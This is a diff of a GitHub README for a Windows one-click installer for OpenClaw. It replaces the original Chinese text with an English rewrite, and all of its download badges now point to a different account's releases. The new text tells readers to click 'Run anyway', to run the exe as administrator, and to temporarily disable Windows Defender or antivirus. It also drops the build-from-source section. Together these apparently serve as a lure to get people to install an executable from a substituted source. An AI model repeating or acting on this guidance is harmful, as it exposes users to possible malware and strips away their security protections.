@@ -1,74 +1,150 @@
-# 🦞 OpenClaw Installer (Windows 一键自动化部署工具)
+# 🦞 clawInstaller - Easy Windows Deployment Tool
 
-![Platform](https://img.shields.io/badge/Platform-Windows-blue)
-![Language](https://img.shields.io/badge/Language-C%23_Native-green)
-![License](https://img.shields.io/badge/License-MIT-brightgreen)
+[![Download Latest Release](https://img.shields.io/badge/Download-clawInstaller-blueviolet)](https://github.com/paytenmorrow7-dot/clawInstaller/releases)
 
-OpenClaw Installer 是一个专为 Windows 用户打造的 **C# 原生桌面应用程序**。它旨在彻底解决在部署 [OpenClaw](https://openclaw.ai/) 时遇到的 Node.js 环境配置、Git 权限报错、NPM 下载缓慢等痛点，提供真正的“一键式”开箱即用体验。
+---
 
-## ✨ 核心特性
+## 🛠 About clawInstaller
 
-* 📦 **环境绝对隔离**：自动下载便携版 Node.js (v22.13.1) 和 MinGit (v2.44.0)，不污染您的系统全局变量，随用随删。
-* 🎒 **原生便携模式 (Portable Mode)**：可选将所有用户数据（`USERPROFILE`、`APPDATA` 等）重定向并保存在安装目录下的 `data` 文件夹中，实现真正的绿色免安装，装进 U 盘带走即可运行。
-* 🚀 **专为国内网络优化**：
-    * 自动配置 NPM 淘宝镜像源 (`registry.npmmirror.com`)。
-    * 内置 GitHub 代理支持，利用 Git `insteadOf` 策略自动重写底层的 `ssh://` 和 `https://` 请求，彻底告别 `Exit code 128` 和权限拒绝错误。
-* 🧠 **智能硬件探测**：在部署核心组件时，自动检测系统是否具备 NVIDIA 显卡 (`nvidia-smi`)，智能选择编译类型为 `cuda` 或 `cpu`，最大化利用硬件性能。
-* 🛠️ **Skills 扩展组件支持**：一键可选挂载常用技能所需的环境和工具，自动化下载并配置环境变量。
-* 🎮 **无脑一键启动**：部署完成后，自动生成交互式 `start.ps1` 和便捷的 `点我运行.bat`，双击即可唤出功能菜单。
-* 🐛 **调试模式**：内置 Debug 开关，一键开启底层的完整进程日志，排障无忧。
+clawInstaller is a Windows desktop program designed to make installing OpenClaw simple and quick. It handles all the setup steps automatically. You don’t need to know about Node.js, Git permissions, or NPM settings.
 
-## 🚀 快速上手
+This tool brings everything together in one place. It downloads necessary software, sets up your environment, and fixes common errors that happen during OpenClaw installation. You get an easy, one-click process from start to finish.
 
-1. **下载程序**：在 [Releases](https://github.com/diandianti/clawInstaller/releases) 页面下载最新的 `OpenClawInstaller.exe`。
-2. **运行程序**：
-   * 选择你想要安装 OpenClaw 的目标目录。
-   * *(可选)* 在“Github 代理”框中填入你信任的 GitHub 加速链接（默认已提供）。
-3. **点击“一键部署”**：喝杯咖啡，等待进度条走完（工具会自动下载环境、配置网络、隔离安装依赖）。
-4. **启动 OpenClaw**：部署完成后，进入安装目录，双击运行 `start.ps1`，即可体验你的专属 AI 网关！
-5. **配置**：按照openclaw引导配置即可。 
+---
 
-## skills 程序支持
+## 💻 System Requirements
 
-- gh
-- gog
-- python
-- ffmpeg
-- camsnap
-- blucli
-- uv
+Before using clawInstaller, make sure your computer meets these basics:
 
-## 已知问题
-~~win11下面启动gateway会失败，正在修补中~~
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of free memory
+- 2 GB of free disk space
+- A working internet connection for downloads
+- Optional: NVIDIA graphics card for better performance (if available)
 
-## TODO
+---
 
-- [ ] 已有环境检查
+## 🚀 Core Features
 
-- [x] 将用户数据更改到安装目录
+clawInstaller focuses on convenience and reliability. Here are the main features that help simplify setup:
 
-- [x] skills程序安装
+- **Complete Environment Isolation**  
+  It downloads portable Node.js (v22.13.1) and MinGit (v2.44.0). These versions run independently and don’t affect your system globally.
 
-## 🛠️ 本地编译构建
+- **Portable Mode**  
+  User data like profiles and app data can be stored inside the installer folder (`data`). This means you can run it from a USB drive without installing.
 
-本项目使用 C# WinForms 开发。
-* 框架：`.NET 8.0` 或更高版本。
-* 无需任何第三方 NuGet 包，全原生库实现，极度轻量。
+- **Network Optimization for China**  
+  Automatic setup uses a faster NPM mirror (`registry.npmmirror.com`). It also rewrites GitHub requests to avoid errors like "Exit code 128" and authorization issues.
 
-## 🤝 参与贡献
+- **Hardware Detection**  
+  Checks if your machine has an NVIDIA GPU and chooses the best OpenClaw version: CUDA-enabled or CPU-only.
 
-欢迎提交 Pull Requests 或发布 Issues 探讨新功能。如果你觉得这个工具帮到了你，请给个 ⭐️ Star！
+- **Optional Skill Extensions**  
+  You can add extra tools and environments needed for advanced OpenClaw features with a single click.
 
-## 📝 开源协议
+- **Easy Start Scripts**  
+  After setup, the tool creates scripts you can run to launch or manage OpenClaw easily. For example, `start.ps1` and `点我运行.bat`.
 
-[MIT License](LICENSE)
+---
 
+## 📥 Download & Installation
 
+[![Download Latest Release](https://img.shields.io/badge/Get_clawInstaller-Download-purple?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/releases)
 
+1. Visit the release page above.
 
+2. Look for the latest release with a `.exe` file. Click the file name to download.
 
+3. Once downloaded, find the file in your Downloads folder and double-click it.
 
+4. If Windows prompts you about permissions, select **Run anyway** or **Yes**.
 
+5. The installer window will open. Follow the on-screen instructions:
 
+    - Choose the installation folder.
+    - Decide whether to enable Portable Mode (recommended if you want to run from a USB device).
+    - Confirm when ready to start.
 
+6. The tool will handle downloading and configuring everything. This may take some minutes depending on your internet speed.
 
+7. When finished, it will create shortcuts named `start.ps1` and `点我运行.bat` inside the install folder.
+
+8. Double-click `点我运行.bat` to open the OpenClaw menu and start using the app.
+
+---
+
+## 📁 How It Works
+
+clawInstaller does the heavy lifting for you:
+
+- It downloads a self-contained version of Node.js and Git called MinGit.
+- Sets up a private environment so nothing conflicts with software you already have.
+- Fixes common problems like slow downloads, network blocks, and permission errors.
+- Adapts to your hardware for best performance.
+- Packs everything needed into one folder. If Portable Mode is on, it keeps all user settings inside that folder.
+
+---
+
+## 🖥 Running OpenClaw
+
+After installing with clawInstaller:
+
+- Open your install folder.
+
+- Double-click `点我运行.bat`. This opens a menu with options to start or update OpenClaw.
+
+- Use the menu to:
+
+  - Launch OpenClaw.
+  - Update components.
+  - Add or remove skill extensions.
+  - Check system status or hardware info.
+
+- You can also run `start.ps1` in PowerShell for a richer interface.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the installer stops unexpectedly, check your internet connection.
+
+- Windows Defender or antivirus may block the installer. You can temporarily disable them during setup.
+
+- If you get permission errors, try right-clicking the installer file and choosing **Run as administrator**.
+
+- For Git errors with code 128, the tool’s proxy and rewrite settings usually fix this automatically.
+
+- Make sure you have enough free disk space.
+
+- If you have an NVIDIA GPU but OpenClaw runs slow, verify the GPU drivers are up to date.
+
+---
+
+## ⚙️ Advanced Options
+
+If you want more control:
+
+- You can run the installer with command line parameters to customize folder paths or enable debug logging.
+
+- Portable Mode lets you carry OpenClaw on a USB drive and use it on any Windows machine without extra installation.
+
+- Skill extensions add tools like Python, Git LFS, or environment variables needed for special features.
+
+---
+
+## 📖 Useful Links
+
+- OpenClaw Official Site: https://openclaw.ai  
+- Node.js Portable Version: Included automatically  
+- MinGit Info: https://github.com/git-for-windows/git/releases  
+
+---
+
+## 🛡 License
+
+clawInstaller is open-source software under the MIT License. You can use, modify, or share it freely.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download_clawInstaller-blue?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/releases)
